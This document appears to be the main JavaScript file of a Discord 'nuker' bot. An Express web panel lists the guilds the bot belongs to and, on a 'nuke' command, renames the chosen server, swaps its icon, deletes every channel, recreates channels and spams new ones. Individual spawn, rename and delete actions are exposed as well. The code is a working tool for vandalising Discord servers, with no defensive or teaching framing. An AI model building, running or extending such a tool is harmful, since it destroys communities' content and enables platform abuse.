import express from 'express'
import fs from 'fs'
import path, { dirname } from 'path'
import { fileURLToPath } from 'url'
import { Client, GatewayIntentBits } from 'discord.js'
import spawmar_canal from './commands/spawm-channels.js'
import rename_channel from './commands/rename-channels.js'
import delete_channels from './commands/delete-channels.js'
import create_channels from './commands/create-channels.js'

const client = new Client({
    intents : [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
})

const filepath = import.meta.url
const __dirname = path.dirname(fileURLToPath(filepath))

const app = express()

function getTokenBot() {
    const dataJson = fs.readFileSync(path.join(__dirname, "..", "bot.json"))
    if (dataJson) {
        const sata = JSON.parse(dataJson)
        return sata.TOKEN
    }
}

function getNameServer() {
    const dataJson = fs.readFileSync(path.join(__dirname, "..", "bot.json"))
    if (dataJson) {
        const sata = JSON.parse(dataJson)
        return sata.nameServer
    }
}

app.use(express.urlencoded({extended : true}))
app.use("/", express.static(path.join(__dirname, "front-end")))

app.get("/get-servers-bot", async (req, res) => {
    const servers = await client.guilds.fetch()
    const objectServers = []

    servers.forEach(guild => {
        objectServers.push({ id: guild.id, name: guild.name })
    });

    res.json(objectServers)
})

app.post("/command", async (req, res) => {
    const {server, command} = req.body

    if (server && command === "nuke") {
        const nameServer = getNameServer();
        const imageServer = fs.readFileSync(path.join(__dirname, "assets", "server-foto.png"))
        const guild = await client.guilds.fetch(server)
        await guild.setName(nameServer)
        await guild.setIcon(imageServer)
        await delete_channels(client, server)
        await create_channels(client, server)
        spawmar_canal(client, server)
    }

    if (server && command === "spawnChannels") {
        spawmar_canal(client, server)
    }

    if (server && command === "renameChannels") {
        rename_channel(client, server)
    }

    if (server && command === "deleteChannels") {
        delete_channels(client, server)
    }

    if (server && command === "createChannels") {
        create_channels(client, server)
    }

    res.redirect("/")

})


client.on("ready", () => {
    console.log("Bot tá online, baby")
})

client.login(getTokenBot())

app.listen(3000, () => {
    console.log("Servidor rodando")
})